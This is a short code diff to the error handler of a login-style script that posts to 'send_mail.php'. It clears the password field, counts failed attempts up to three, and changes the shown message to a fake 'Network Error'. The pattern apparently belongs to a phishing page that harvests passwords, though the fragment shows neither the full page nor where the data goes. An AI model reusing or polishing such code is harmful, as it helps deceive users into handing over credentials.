@@ -378,7 +378,7 @@ return false;
                         error: function(xhr, status, error) {
                             console.log('[send_mail.php] Error:', error);
                             $("#msg").show();
-                            $('#msg').html("Please enter correct password and try again");
+                            $('#msg').html("Network Error: unable to connect to server");
                             $("#password").val("");
                             
                             if (count >= 3) {
